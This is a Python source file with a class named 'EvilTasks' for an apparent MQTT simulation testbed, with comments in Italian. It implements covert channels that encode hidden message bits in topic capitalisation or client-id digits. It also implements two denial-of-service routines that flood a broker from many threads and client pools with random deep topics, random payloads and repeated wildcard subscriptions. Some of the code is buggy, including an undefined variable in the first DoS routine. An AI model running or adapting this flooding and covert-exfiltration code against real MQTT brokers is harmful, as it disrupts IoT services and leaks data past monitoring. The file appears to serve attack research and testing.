##################################### CLASS #############################################
################################### EVIL TASKS ##########################################
# CURRENT # 
# This class is designed to contain malicious tasks and covert channels implementation.
# In terms of malicious tasks at the moment, only the Denial of service attack is 
# implemented.
# The covert channels proposed are 2: one encodes a bit 1 or 0 according to the fact that the
# first letter of the topic is capital or not.
# The second covert channel encodes a bit 1 or 0 in the id of the MQTT client.
# NEXT # 
# methods will be added to this class in order to implement new features, attacks and
# covert channels

import time
import threading, random, string
from Utils.Distributions import Distributions
import multiprocessing

class EvilTasks:
	
	def __init__(self, MQTT_object):
		
		self.MQTT_object = MQTT_object



	#Embed a message using one of the possible methods
	### IMPORTANTE: PROVARE A RIMUOVERE MATCH CASE E SELEZIONARE LA FUNZIONE CON INDIRIZZAMENTO DIRETTO -> try {functions[method] ... method()}
	def embed_message(self, current_topic, flag_bit, method):
		
		tokens_topic = current_topic.split("/")
		last_topic = tokens_topic[-1]
		method = method.lower()
		#print(f"Current topic: {current_topic}, flag_bit: {flag_bit}, method: {method}")
		match method:
			
			case "first letter":
				new_topic = self.hide_in_first_letter(current_topic, last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case "id":
				new_topic = self.hide_in_id(last_topic, flag_bit)
				tokens_topic[-1] = new_topic
				return "/".join(tokens_topic)

			case _:
				return current_topic



	#First letter of the topic is capital then 1 otherwise 0
	def hide_in_first_letter(self, current_topic, last_topic, flag_bit):
		
		char = last_topic[0]
		if not last_topic:
			
			return current_topic

		if flag_bit == "1":
			
			modified_last_topic = char.upper() + last_topic[1:]
		else:

			modified_last_topic = char.lower() + last_topic[1:]

		return modified_last_topic



	#Adds either 0 or 1 to the end of the topic
	def hide_in_id(self, last_topic, flag_bit):
		
		id_number = int(flag_bit) + 1
		modified_last_topic = last_topic + str(id_number)
		return modified_last_topic



	#Covert publication with specific embedding method
	def covert_publish(self, publisher, topic, message, payload, qos, method, delay, retain=False):
		
		bit_msg = ""

		for char in message:
			bit_msg += format(ord(char), "08b")

		try:
			
			for bit in bit_msg:
				new_topic = self.embed_message(topic, bit, method=method)
				print(f"NEW TOPIC: {new_topic}")
				self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, payload, retain)
				time.sleep(delay)

		except Exception as e:
			print(f"Error while sending hidden message")



	#Periodic publication method. Takes a device config and sends periodically the message
	def periodic_publish(self, publisher, config):
		
		if publisher._client_id:

			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			period = float(config["Period"])
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
			retain = config.get("Retain", False)
		
		except Exception as e:
			print(f"Error while collecting data from configuration: {e}")

		if device_type == "counterfeit" and covert_message:
			
			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
			time.sleep(period)



	#Publication method for event
	def event_publish(self, publisher, config):
		
		if publisher is None:
			return

		if publisher._client_id:
			
			publisher_id = publisher._client_id.decode()
		else:

			publisher_id = "anonymous"

		try:
			
			topic = config["Topic"]
			qos = int(config["QoS"])
			payload = config["Payload"]
			inf = float(config["MinRange"])
			sup = float(config["MaxRange"])
			distribution = str(config.get("Distribution", "uniform")).lower()
			device_type = str(config.get("DeviceType", "legit")).strip().lower()
			covert_message = config.get("HiddenMessage")
			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
			retain = config.get("Retain", False)
		except Exception as e:
			print("Error while reading devices configurations")

		period = 1.0	#default

		### IMPORTANTE: mettere le funzioni come valori di un dictionary aventi come chiavi "uniform", "exponential", "normal", in modo da evitare match case. Racchiudere tutto con blocco try/catch
		match distribution:

			case "uniform":
				period = Distributions.draw_from_uniform(inf, sup)

			case "exponential":
				period = Distributions.draw_from_exponential(inf, sup)

			case "normal":
				period = Distributions.draw_from_gaussian(inf, sup)

			case _:
				period = Distributions.draw_from_uniform(inf, sup)

		if period < 0:

			period = 1.0

		if device_type == "counterfeit":

			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
		else:

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
			time.sleep(period)


##RAM check
	def check_RAM_container(self, flag, publish_interval, CONTROL_RATE=0.9, MIN_PUBLISH_INTERVAL=0.01):
		
		# Lettura RAM (per container)
		with open("/sys/fs/cgroup/memory.current") as f:
			USED_RAM = int(f.read())

		with open("/sys/fs/cgroup/memory.max") as f:
			max_mem = f.read().strip()
			if max_mem == "max":
				TOTAL_RAM = None
			else:
				TOTAL_RAM = int(max_mem)

		USED_PERCENTAGE = USED_RAM / TOTAL_RAM

		if USED_PERCENTAGE >= CONTROL_RATE:
			flag = True
			# RAM sopra soglia: rallenta -> Aumenta l'intervallo proporzionalmente alla RAM usata in eccesso
			overload_ratio = (USED_PERCENTAGE - CONTROL_RATE) / (1 - CONTROL_RATE)
			publish_interval = publish_interval * (1 + overload_ratio * 0.7)
			# Mantieni almeno il minimo
			publish_interval = max(MIN_PUBLISH_INTERVAL, publish_interval)

		elif USED_PERCENTAGE < CONTROL_RATE and flag == True:
			# Riduci l'intervallo proporzionalmente alla quantità di RAM libera
			free_ratio = 1 - USED_PERCENTAGE  # più è alto, più RAM libera
			# Riduci publish_interval, ma non sotto il minimo
			publish_interval = max(MIN_PUBLISH_INTERVAL, publish_interval * (1 - free_ratio * 0.5))
			flag = False

		return flag, publish_interval

##Preserva il requisito dell'utente e se la ram si satura, parte un algoritmo di controllo per la regolazione automatica del tempo interpacchetto:
	def DoS_task(self, client_id, config, end_time, protocol, retain=False):

		#import psutil
		import time
		import random
		import string
		import uuid

		topic = config["Topic"]
		qos = int(config["QoS"])
		payload = config["Payload"]
		publish_interval = float(config["Period"])
		publisher = self.MQTT_object.mqtt_register_client(client_id, protocol)
		flag = False

		MIN_PUBLISH_INTERVAL = 0.001  # minimo 100 ms
		CONTROL_RATE = 0.9  # soglia percentuale di RAM usata

		while publisher is not None and time.time() < end_time:

			flag, publish_interval = self.check_RAM_container(flag, publish_interval, CONTROL_RATE, MIN_PUBLISH_INTERVAL)
			#Introduce random topics
			# random_number = random.randint(0, 9999999)
			# new_topic = f"{topic}/{random_number}"
			new_topic = "/".join(str(uuid.uuid4()) for _ in range(80))#Fare prova mantenendo costante i payloads e facendo variare i percorsi

			#new_payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
			new_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=120))


			self.MQTT_object.mqtt_publish_msg(publisher, new_topic, qos, new_payload, retain)
			#self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
			time.sleep(publish_interval)

			print(f"Publish interval: {publish_interval:.3f} s, RAM used: {USED_PERCENTAGE:.2%}")




	def DoS2(self, client_id, config, end_time, protocol, retain=False):
		import time
		import random
		import string
		import gc

		CONTROL_RATE = 0.8
		MIN_PUBLISH_INTERVAL = 0.1
		topic = config["Topic"]
		qos = int(config["QoS"])
		payload = config["Payload"]
		publish_interval = float(config["Period"])
		duration = float(config["Duration"])
		sub_topic = "#"

		# Numero di client nel pool
		POOL_SIZE = 20

		# Pre-creazione del pool
		client_pool = []
		i = 1
		while len(client_pool) < POOL_SIZE:
			client_id_i = f"{client_id}_{i}"
			client = self.MQTT_object.mqtt_register_client(client_id_i, protocol)
			time.sleep(0.5)
			if client is not None:
				print(f"Created client: {client_id_i}")
				client.loop_start()
				client_pool.append(client)
			i += 1


		i = 0
		flag = False

		while time.time() < end_time:
			
			flag, publish_interval = self.check_RAM_container(flag, publish_interval, CONTROL_RATE, MIN_PUBLISH_INTERVAL)

			# Seleziona client dal pool in modo circolare
			publisher = client_pool[i % POOL_SIZE]
			topic = "/".join("".join(random.choices(string.ascii_letters + string.digits, k=5)) for _ in range(20))
			payload = ''.join(random.choices(string.ascii_letters + string.digits, k=120))

			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
			#self.MQTT_object.mqtt_topic_subscription(publisher, sub_topic, qos)
			time.sleep(publish_interval)

			i += 1

		# Resubscription phase
		end_resubscription_time = time.time() + 4 * duration
		subscription_expiration = 0.05
		i = 0
		while time.time() < end_resubscription_time:

			subscriber = client_pool[i % POOL_SIZE]
			client_id_i = f"{client_id}_{i}"

			time.sleep(0.01)
			self.MQTT_object.mqtt_topic_subscription(subscriber, sub_topic, qos)
			self.MQTT_object.mqtt_topic_subscription(subscriber, sub_topic, qos)
			self.MQTT_object.mqtt_topic_subscription(subscriber, sub_topic, qos)
			self.MQTT_object.mqtt_topic_subscription(subscriber, sub_topic, qos)
			self.MQTT_object.mqtt_topic_subscription(subscriber, sub_topic, qos)

			#Trigger a RST on TCP connection: problem, the kernel does not free the resources immediately
			# try:
			# 	socket_tcp = subscriber._sock
			# 	socket_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
			# 	socket_tcp.close()
			# except Exception as e:
			# 	print("Errore reset")

			i += 1

		for client in client_pool:
			client.loop_stop()
			client.disconnect()

		del client_pool
		gc.collect()




	#Spawn num_clients threads and each one of them makes a DoS_task
	def DoS_attack(self, config, protocol, retain, role):
		
		num_clients = int(config["NumClients"])
		duration = float(config["Duration"])
		end_time = time.time() + duration
		topic = config["Topic"]
		publish_interval = float(config["Period"])
		retain = str(config["Retain"])
		if retain == "True":
			retain = True
		else:
			retain = False

		func = None
		if role == "denial of service":
			func = self.DoS_task
		elif role == "denial of service 2":
			func = self.DoS2
		print(f"Role : {role}")


		print("Starting DoS")

		for i in range(num_clients):
			thread = threading.Thread(target=func, args=(f"dos_client_{i}", config, end_time, protocol, retain))
			thread.daemon = False
			print("Inizio DoS")
			#thread.daemon = False
			self.MQTT_object.working_threads.append(thread)
			thread.start()
